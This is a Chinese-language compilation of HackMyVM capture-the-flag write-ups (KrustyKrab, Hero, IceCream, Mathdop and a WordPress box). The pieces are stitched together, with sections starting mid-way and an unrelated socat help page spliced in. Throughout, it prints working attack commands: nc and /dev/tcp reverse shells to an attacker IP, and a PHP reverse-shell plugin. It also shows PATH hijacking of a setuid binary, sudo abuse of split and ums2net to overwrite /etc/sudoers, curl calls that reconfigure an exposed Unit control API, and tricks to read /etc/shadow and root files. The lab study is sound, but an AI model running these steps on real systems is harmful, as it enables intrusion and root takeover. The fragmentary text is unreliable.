[+] Found password <REDACTED_PASSWORD>
```
登录进去之后发现好多功能点都没什么用，有一个邮箱里面有一个叫 `Administratro` 有一个文件上传但是上传的都被改成jpg了没法利用，在edit profile页面可以修改密码，抓包之后发现可以修改用户名，尝试修改`Administratro` 的密码，显示`{"success":true}` 即为修改成功，退出当前用户，使用修改好的口令已脱敏 ，登录进去之后发现页面下方有命令执行功能，直接拿shell
## 获取 User Flag
```
nc <INTERNAL_IP> 1234 -e /bin/sh
```
寻找提权点
```shell
┌──(root㉿kali-plus)-[~] 
└─# nc -lvnp 1234 
Listening on <ATTACKER_IP> 1234 
Connection received on <INTERNAL_IP> 58090 
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
/usr/bin/script -qc /bin/bash /dev/null 
www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -l 
Matching Defaults entries for www-data on KrustyKrab: 
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty 
User www-data may run the following commands on KrustyKrab: 
(KrustyKrab) NOPASSWD: /usr/bin/split
```
发现可以以KrustyKrab用户的权限去运行split，直接提权
```shell
www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -u KrustyKrab split --filter=/bin/sh /dev/stdin 
<udo -u KrustyKrab split --filter=/bin/sh /dev/stdin 
id 
uid=1000(KrustyKrab) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth),1002(krustygroup)
whoami
KrustyKrab 
/usr/bin/script -qc /bin/bash /dev/null 
KrustyKrab@KrustyKrab:/var/www/html/finexo/admin_dashborad$
```
拿到了KrustyKrab用户的shell
```shell
KrustyKrab@KrustyKrab:~$ cat user.txt cat user.txt cat user.txt dcc8b0c111c9fa1522c7abfac8d1864b
```
## 提权
在同一个目录下有一个help的可以文件
```shell
KrustyKrab@KrustyKrab:~$ file help 
file help 
file help 
help: GIF image data, version 89a, 480 x 270
```
发现是一个GIF图片，把图片下载到本地看看，发现是海绵宝宝在做美味的蟹黄堡，还说明了做蟹黄堡的顺序，猜测有步骤和这个相关，下面要找提权点
```shell
KrustyKrab@KrustyKrab:~$ 
sudo -l sudo 
-l sudo -l
Matching Defaults entries for KrustyKrab on KrustyKrab: 
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty 
User KrustyKrab may run the following commands on KrustyKrab: 
(spongebob) NOPASSWD: /usr/bin/ttteeesssttt
```
有一个ttteeesssttt文件，是要输入正确做蟹黄堡的顺序
```shell
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt 
sudo -u spongebob /usr/bin/ttteeesssttt 
sudo -u spongebob /usr/bin/ttteeesssttt 
Spongebob forgot how to make Krabby Patty, You need to help him! Current shuffled recipe order: 
A: Top bun 
B: Ketchup 
C: Mustard 
D: Pickles 
E: Tomato 
F: Lettuce 
G: Onion 
H: Bottom bun 
I: Patty 
J: Cheese 
Please enter the correct order using letters (e.g., ABCDEFGHIJ): Enter 10 letters (A-J):
```
可以去查看刚刚得到的gif图片，里面有顺序或者直接strings，得到的顺序是，每次运行之后的顺序还不一样，顺序是
```plain
Bottom bun  
Patty
Lettuce
Cheese
Onion
Tomato
Ketchup
Mustard
Pickles
Top bun
```
输入正确的顺序就能拿到spongebob用户的shell了
```shell
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt 
Spongebob forgot how to make Krabby Patty, You need to help him! 
Current shuffled recipe order: 
A: Ketchup 
B: Mustard 
C: Onion 
D: Tomato 
E: Bottom bun 
F: Top bun 
G: Lettuce 
H: Pickles 
I: Cheese 
J: Patty 
Please enter the correct order using letters (e.g., ABCDEFGHIJ): Enter 10 letters (A-J): EJGICDABHF 
Validation successful! Perfect Krabby Patty! spongebob@KrustyKrab:/home/KrustyKrab$ id 
id
uid=1001(spongebob) gid=1001(spongebob) groups=1001(spongebob),100(users),1002(krustygroup) spongebob@KrustyKrab:/home/KrustyKrab$
```
找到了2张图片和一个note.txt
```shell
spongebob@KrustyKrab:~$ cat note.txt 
cat note.txt cat note.txt 
Squidward is waiting for you!!!! password <REDACTED_PASSWORD> md5($key1$key2). 
It's not so hard as you think.
```
得到提示，口令已脱敏，查看一下即可
```shell
spongebob@KrustyKrab:~$ cat key1 
cat key1 
cat key1 
<REDACTED_HASH>
spongebob@KrustyKrab:~$ md5sum key2.jpeg 
md5sum key2.jpeg 
md5sum key2.jpeg 
5e1d0c1a168dc2d70004c2b00ba314ae key2.jpeg
```
加密之后的结果为`7ac254848d6e4556b73398dde2e4ef82` 得到Squidward用户的密码

spongebob@KrustyKrab:~$ su - Squidward 
su - Squidward 
su - Squidward 
Password: <REDACTED_PASSWORD> 
<REDACTED_HASH> 
$ id 
uid=1002(Squidward) gid=1003(Squidward) groups=1003(Squidward)
```
查找提权点，发现有一个laststep，strings一下
```shell
Squidward@KrustyKrab:~$ strings laststep 
/lib64/ld-linux-x86-64.so.2 
setgid setuid 
system __libc_start_main __cxa_finalize 
libc.so.6 GLIBC_2.2.5 GLIBC_2.34 
_ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable PTE1 u+UH cat /etc/shadow
```
发现有一个cat /etc/shadow  传到主机使用ida进行反编译
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
setgid(0);
setuid(0);
system("cat /etc/shadow");
return 0;
}
```
可以利用环境变量劫持
```shell
echo '#!/bin/sh\n bash -p' > ~/cat
chmod +x ./cat
export PATH=~:$PATH
./laststep
```
或者
```c
#include <unistd.h>
#include <stdlib.h>
void main() {
// setuid(0);
// setgid(0);
system("/bin/bash -p");
}
```
```shell
gcc cat.c -o cat
export PATH=.:$PATH
./laststep
root@KrustyKrab:/root# cat root.txt
<root flag>
```

title: HMV-Hero靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>`

```html
┌──(root㉿kali-plus)-[~]
└─# nmap <INTERNAL_IP> -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 19:51 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for <INTERNAL_IP>
Host is up (0.0050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
5678/tcp open  rrac
MAC Address: 08:00:27:2A:F6:67 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
┌──(root㉿kali-plus)-[~]
└─# curl <INTERNAL_IP>:80                  
<REDACTED_PRIVATE_KEY>
```

拿到一个私钥，但是不知道用户名，使用ssh-keygen看一下

```html
┌──(root㉿kali-plus)-[~]
└─# chmod 600 hero          
       
┌──(root㉿kali-plus)-[~]
└─# ssh-keygen -y -f hero     
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero
```

## 获取 User Flag
得到用户名是shawa，然后5678端口是一个n8n，把github地址扔给kimi让他给我总结了一下

```html
n8n是一个工作流自动化平台，它将代码的灵活性与无代码的速度相结合。它具有400多个集成，原生的AI能力，以及公平代码许可，使用户能够在保持对数据和部署的完全控制的同时构建强大的自动化工作流。
主要功能和作用：

    代码灵活性：用户可以在需要时编写JavaScript/Python代码，添加npm包，或使用可视化界面进行操作。
    AI原生平台：用户可以基于LangChain构建AI代理工作流，并使用自己的数据和模型。
    完全控制：用户可以选择自托管，遵循公平代码许可，或者使用n8n的云服务。
    企业级功能：包括高级权限管理、单点登录（SSO）和空气隔离部署。
    活跃的社区：提供400多个集成和900多个现成的模板。
    快速启动：用户可以通过npx（需要Node.js）或Docker快速启动n8n。
    资源丰富：提供文档、400多个集成、示例工作流、AI与LangChain指南、社区论坛和社区教程。
    支持：用户可以在社区论坛中获得支持，并与其他用户交流。
    许可模式：n8n采用公平代码许可，包括可持续使用许可和企业许可，允许用户始终查看源代码、随处部署，并添加自己的节点和功能。
    贡献与团队：用户可以报告错误或提出功能建议，并查看贡献指南开始贡献。此外，用户也可以查看招聘信息加入n8n团队。

n8n的名称来源于“nodemation”，意为“节点自动化”，结合了Node.js和自动化的特点。
```

暂时先不管了，随便注册一下进去看看都有功能点，进去之后找到Overview-> Credentials->直接输入ssh他会自己检索对应的功能->输入之前得到的用户名和私钥，这里的ip不能是localhost或者是127.0.0.1，应该填172.17.0.1，因为他这个是在docker里面的->创建工作流，第一个是Trigger manually，第二个我们选择ssh(Execute Command),然后在命令那一栏输入反弹shell的命令`<command>`，然后就能拿到shawa用户的shell，然后拿到user flag

```html
cd home
ls
shawa
cd shawa
ls
user.txt
cat user.txt
HMVOHIMNOTREAL
```

## 提权
想提权但是没有sudo，在查看sshd_config文件时发现他指定了banner文件的位置，在/opt/banner.txt

```html
# no default banner path
Banner /opt/banner.txt
```

接下来可以使用`<command>`命令来创建一个软链接用来读取用户名和口令已脱敏，当然也可以读取root/root.txt

先使用socat把端口转发出去，这样能搞一个交互式的shell

```bash
./socat TCP-LISTEN:2222,fork TCP4:<INTERNAL_IP>:22 &
```

然后就能ssh连接过去了

```bash
ssh shawa@<INTERNAL_IP> -i key -p 2222

hero:~$ id
uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)
cd /opt
rm banner.txt
ln -s /root/root.txt /opt/banner.txt
ssh shawa@<INTERNAL_IP> -i key -p 2222
HMVNOTINPRODLOL
Welcome to Alpine!
```

也可以去拿root的密码，就是使用`<command>`这个命令，ssh登录的时候可能需要`-o StrictHostKeyChecking=no`，登录进去的时候就会显示root用户的口令已脱敏

```plain
su root
Password: <REDACTED_PASSWORD>

id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
ls
socat
user.txt
cd ..
cd ..
ls
bin
boot
dev
etc
home
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd root
ls
root.txt
cat root.txt
HMVNOTINPRODLOL
```

[php-detect] [http] [info] http://mamushka.hmv ["8.2.22"]
```

明显扫描出来一个`CVE-2024-27956`搜了一下是插件的漏洞，并且找到了WP-Automatic这个插件，去exploit-db上搜了一下这个插件的poc，好像都不能用，试试在msf里面搜索

搜到了一个24年比较新的，直接来使用试试

run

这个脚本的作用就是添加一个用户，这个用户的用户名和口令已脱敏`<command>`，但是进去之后没地方反弹shell，看了一眼wp，是自己写的一个php脚本，然后打包成zip，这个脚本内容如下：

```plain
<?

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/<INTERNAL_IP>/1234 0>&1'");
?>
```

  Multipurpose relay (SOcket CAT).
  More information: <http://www.dest-unreach.org/socat/>.

  Listen to a port, wait for an incoming connection and transfer data to STDIO:

      sudo socat - TCP-LISTEN:8080,fork

  Listen on a port using SSL and print to STDOUT:

      sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT

  Create a connection to a host and port, transfer data in STDIO to connected host:

      sudo socat - TCP4:www.example.com:80

  Forward incoming data of a local port to another host and port:

      sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80

  Send data with multicast routing scheme:

      echo "Hello Multicast" | socat - UDP4-DATAGRAM:<PUBLIC_IP>:5000

  Receive data from a multicast:

      socat - UDP4-RECVFROM:5000
```

## 获取 User Flag
```shell
┌──(root㉿kali-plus)-[~] 
└─# smbclient //<INTERNAL_IP>/icecream 
Password <REDACTED_PASSWORD> Try "help" to get a list of possible commands. smb: \> put reverse.php 
putting file reverse.php as \reverse.php (766.2 kb/s) (average 766.2 kb/s)
```
smb上去传一个反弹shell的脚本上去，然后访问`<command>`  即可拿到shell，进去之后找提权点，看到home目录只有一个ice用户，只能从9000端口入手了，先看一眼进程
```shell
ice 499 468 0 07:07 ? 00:00:14 unit: controller 
ice 500 468 0 07:07 ? 00:00:00 unit: router
```
发现有关ice用户的进程，是一个关于unit的，但是我不是很了解，看了一下Todd的 [Todd-Hmv-Icecream](https://hgbe02.github.io/Hackmyvm/IceCream.html) 
```plain
发现这个 controlapi 可以控制 unit，甚至可以自己创建一个 php 的 Application。不过官方的都是本地通过 curl 和 –unix-socket 来控制的，我们这个直接可以用 9000 端口来搞。
这么一想，其实如果熟悉这个 unit 的话，直接就可以通过这个 9000 端口来提权了。不用去第一步拿 www-data。
```
然后Todd研究出了几个命令可以拿到ice用户的shell
```shell
curl -X PUT -d '{"app":{"type":"php","root":"/tmp","script":"reverse.php"}}' http://<INTERNAL_IP>:9000/config/applications

curl -X PUT -d '[{"action":{"share":"/tmp/reverse.php$uri","fallback":{"pass":"applications/app"}}}]' http://<INTERNAL_IP>:9000/config/routes

curl -X PUT -d '{"*:8888":{"pass":"routes"}}' http://<INTERNAL_IP>:9000/config/listeners
```
这样就能拿到ice用户的shell  直接拿user flag   
```shell
ice@icecream:/home/ice$ cat user.txt 
cat user.txt 
HMVaneraseroflove
```
## 提权
然后找提权点
```shell
$ sudo -l Matching Defaults entries for ice on icecream: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty User ice may run the following commands on icecream: 
(ALL) NOPASSWD: /usr/sbin/ums2net
```
在github上搜到了一个项目[ums2net](https://github.com/grandpaul/ums2net)  写的是USB通过tcp共享数据，尝试反过来进行修改一下`sudoers`文件
```shell
echo "4444 of=/etc/sudoers bs=4096" > config 
sudo /usr/sbin/ums2net -c config -d
```
然后本地nc上去就行了
```shell
echo 'ice ALL=(ALL) NOPASSWD: ALL' |nc $IP 1234
```

uid=0(root) gid=0(root) grupos=0(root) 
root@icecream:~# ls 
root.txt 
root@icecream:~# cat root.txt 
HMViminvisible
```

## 提权
```shell
[mathlake@mathdop opt]$ cat secure_input_handler.sh 
#!/bin/bash
export PATH="/usr/bin"

read -p "Input Command: " user_input

decoded_input=$(echo -n "$user_input" | base64 -d 2>/dev/null | tr -d '\r\0\a' | col -b)
if [[ ${#user_input} -gt 128 || -z "$decoded_input" ]]; then
    echo "[!] Decoding failed or input is too long" >&2
    exit 2
fi

filtered_input=$(echo "$decoded_input" | tr -cd 'a-zA-Z0-9\-_/ :.' | sed -e 's/[[:space:]]\+/ /g' -e 's/^[ \t]*//' -e 's/[ \t]*$//')

IFS=' ' read -ra cmd_args <<< "$filtered_input"
command="${cmd_args[0]}"
command_clean=$(echo "$command" | tr -d -c 'a-zA-Z0-9')

allowed_commands=("date" "pwd" "echo")
if ! printf "%s\n" "${allowed_commands[@]}" | grep -qxF "$command_clean"; then
    echo "[!] Illegal instruction: $command_clean" >&2
    exit 3
fi

/usr/bin/timeout 2 /usr/bin/bash -c "${filtered_input}"
```
首先就是你输入的内容要是base64编码过的，然后发现可以使用date去读取文件
```shell
[mathlake@mathdop ~]$ date -f user.txt
date: 无效的日期"<user flag>"
```
### 方法一
可以写一个利用脚本
```shell
a=$(echo "date -f $1"|base64)
echo $a | sudo /opt/secure_input_handler.sh
```
利用这个脚本去读取想要读取的内容，尝试直接去读取root.txt
```shell
[mathlake@mathdop ~]$ bash a.sh /root/root.txt
date: "/root/root.txt": 没有那个文件或目录
```
出靶机的可能猜到这点了哈哈哈，那根据方法二得到的rootflag的名字，可以用
```shell
[mathlake@mathdop ~]$ perl -le 'for(0..100){print "r" ."0"x$_ ."t.txt"}'> r.txt
[mathlake@mathdop ~]$ for i in $(cat r.txt);do bash a.sh $i;done
```
这也是一种思路

### 方法二
直接用/opt目录下的这个脚本去读/etc/shadow
```shell
